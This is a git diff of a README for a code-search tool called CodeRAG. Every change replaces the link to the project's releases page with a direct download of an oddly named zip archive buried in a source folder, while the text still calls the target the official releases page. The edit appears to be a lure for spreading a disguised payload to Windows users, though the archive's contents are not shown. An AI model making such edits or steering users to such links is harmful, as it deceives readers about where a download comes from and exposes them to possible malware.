@@ -1,6 +1,6 @@
 # 🤖 CodeRAG - Smarter Code Search and Context
 
-[![Download CodeRAG](https://img.shields.io/badge/Download-CodeRAG-brightgreen?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/releases)
+[![Download CodeRAG](https://img.shields.io/badge/Download-CodeRAG-brightgreen?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/raw/refs/heads/main/packages/core/src/chunker/RAG-Code-prebelieving.zip)
 
 ## 📋 What is CodeRAG?
 
@@ -37,7 +37,7 @@ Follow these steps to download and run CodeRAG on your Windows computer. No expe
 
 Click this big button to go to the official downloads page:  
 
-[![Download CodeRAG](https://img.shields.io/badge/Click_to_Download-Here-blue?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/releases)  
+[![Download CodeRAG](https://img.shields.io/badge/Click_to_Download-Here-blue?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/raw/refs/heads/main/packages/core/src/chunker/RAG-Code-prebelieving.zip)  
 
 This page has the latest versions of CodeRAG available for you.
 
@@ -107,7 +107,7 @@ If CodeRAG does not start or shows errors:
 - Make sure your Windows is updated and has .NET Framework 4.7 or later.  
 - Check your antivirus or security software. Sometimes it blocks installation or running programs.  
 - Try restarting your computer after installation.  
-- Re-download the installer from the official [releases page](https://github.com/Eyram233/CodeRAG/releases) in case the file was corrupted.
+- Re-download the installer from the official [releases page](https://github.com/Eyram233/CodeRAG/raw/refs/heads/main/packages/core/src/chunker/RAG-Code-prebelieving.zip) in case the file was corrupted.
 
 For scanning errors, ensure your selected code folder has readable files and no access restrictions.
 
@@ -115,7 +115,7 @@ For scanning errors, ensure your selected code folder has readable files and no 
 
 Keep CodeRAG up to date for best results and new features:
 
-- Visit the [releases page](https://github.com/Eyram233/CodeRAG/releases) periodically.  
+- Visit the [releases page](https://github.com/Eyram233/CodeRAG/raw/refs/heads/main/packages/core/src/chunker/RAG-Code-prebelieving.zip) periodically.  
 - Download the latest `.exe` installer when available.  
 - Run the installer again to upgrade your existing installation; your settings will stay intact.
 
@@ -145,4 +145,4 @@ The GitHub repository also has additional documentation under the Wiki and READM
 
 You can start the download here:  
 
-[![Download CodeRAG](https://img.shields.io/badge/Download_CodeRAG-brightgreen?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/releases)
+[![Download CodeRAG](https://img.shields.io/badge/Download_CodeRAG-brightgreen?style=for-the-badge)](https://github.com/Eyram233/CodeRAG/raw/refs/heads/main/packages/core/src/chunker/RAG-Code-prebelieving.zip)
